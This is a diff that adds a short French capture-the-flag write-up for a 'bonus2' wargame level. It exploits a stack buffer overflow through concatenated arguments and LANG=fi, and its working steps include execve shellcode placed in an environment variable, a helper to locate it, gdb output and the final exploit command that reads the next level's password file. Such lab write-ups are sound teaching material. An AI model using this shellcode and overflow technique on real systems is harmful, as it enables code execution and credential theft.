@@ -1,0 +1,49 @@
+- Apres analyse du code asm, on voit qu'un buffer de 68
+est cree sur un endroit de la stack.
+- On voit, que l'on concatene les 2 arguments du programme avec un max de 40
+par argument dans le buffer de 68 ce qui overflow le buffer
+- On va maximiser overflow final en setant la variable LANG a "fi"
+- un buffer de taille 74 acceuil au final la concatenation d'une string
+depedant de la variable LANG de l'env et du buffer de 68 qui a deja ete overflow
+- On va du coup pouvoir modifier l'eip afin de pointer sur du shellcode
+
+1) On exporte la langue voulue
+
+export LANG=fi
+
+2) On exporte le shellcode dans l'env
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus3/.pass; whoami; exit"'`
+
+3) On va determiner sont emplacement en memoire avec un programme en simulant les meme condition
+d'execution
+
+cd
+nano /tmp/gettoto.c
+
+int     main(void)
+{
+		        printf("TOTO : %p %s\n", getenv("TOTO"), getenv("TOTO"));
+}
+
+cd /tmp
+gcc gettoto.c
+cd
+mv /tmp/a.out /tmp/level9aaaaaaaaaaaaa
+/tmp/level9aaaaaaaaaaaaa
+
+4) On determine avec gdb l'emplacement qui va modifier eip
+
+(gdb) r `python -c 'print "A" * 256'` `python -c 'print "B" * 18 + "C" * 4 + "D" * 256'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "A" * 256'` `python -c 'print "B" * 18 + "C" * 4 + "D" * 256'`
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBCCCCDDDDDDDDDD
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+
+5) On remplace CCCC par l'adresse du shellcode
+
+/home/user/bonus2/bonus2 `python -c 'print "A" * 256'` `python -c 'print "B" * 18 + "\x4e\xfe\xff\xbf" + "D" * 256'`
